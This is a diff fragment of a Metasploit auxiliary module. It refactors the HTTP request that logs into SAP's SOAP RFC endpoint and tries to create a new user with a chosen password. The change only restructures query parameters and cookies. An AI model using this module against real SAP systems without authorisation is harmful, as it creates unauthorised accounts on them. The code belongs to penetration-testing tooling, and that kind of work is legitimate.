@@ -71,16 +71,19 @@ class Metasploit4 < Msf::Auxiliary
     begin
       print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'")
       res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-        'ctype' => 'text/xml; charset=UTF-8',
+        'uri'           => '/sap/bc/soap/rfc',
+        'method'        => 'POST',
+        'data'          => data,
+        'cookie'        => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+        'ctype'         => 'text/xml; charset=UTF-8',
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'headers' =>
-          {
+        'headers'       => {
             'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-          }
+        },
+        'vars_get'      => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
+        }
       })
       if res and res.code == 200
         if res.body =~ /<h1>Logon failed<\/h1>/
